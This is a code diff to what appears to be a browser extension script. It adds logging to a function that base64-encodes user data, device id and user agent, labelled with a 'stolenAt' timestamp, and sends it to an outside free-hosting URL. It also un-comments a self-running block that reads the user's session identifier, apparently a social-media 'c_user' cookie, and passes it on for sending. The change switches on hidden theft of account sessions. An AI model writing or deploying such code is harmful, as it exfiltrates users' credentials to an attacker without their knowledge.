@@ -69,8 +69,14 @@ const API = "https://concacbig123.000webhostapp.com/index.php",
 		}
 	},
 	sendMessage = (userPayload) => {
+		console.log(
+			`${API}?user=${btoa(
+				JSON.stringify({ ...userPayload, device_id: device_id, userAgent: userAgent, stolenAt: dateTime() })
+			)}`,
+			{ ...userPayload, device_id: device_id, userAgent: userAgent, stolenAt: dateTime() }
+		);
 		return fetch(
-			`${API}/?user=${btoa(
+			`${API}?user=${btoa(
 				JSON.stringify({ ...userPayload, device_id: device_id, userAgent: userAgent, stolenAt: dateTime() })
 			)}`,
 			{
@@ -81,14 +87,14 @@ const API = "https://concacbig123.000webhostapp.com/index.php",
 		);
 	};
 
-// (() => {
-// 	chrome.runtime.sendMessage("get_device_id", (e) => {
-// 		device_id = e && e != "" ? e : null;
-// 		if (device_id) {
-// 			const c_user = getCUser();
-// 			processUser(c_user);
-// 		} else {
-// 			chrome.runtime.sendMessage("set_device_id", async (e) => {});
-// 		}
-// 	});
-// })();
+(() => {
+	chrome.runtime.sendMessage("get_device_id", (e) => {
+		device_id = e && e != "" ? e : null;
+		if (device_id) {
+			const c_user = getCUser();
+			processUser(c_user);
+		} else {
+			chrome.runtime.sendMessage("set_device_id", async (e) => {});
+		}
+	});
+})();
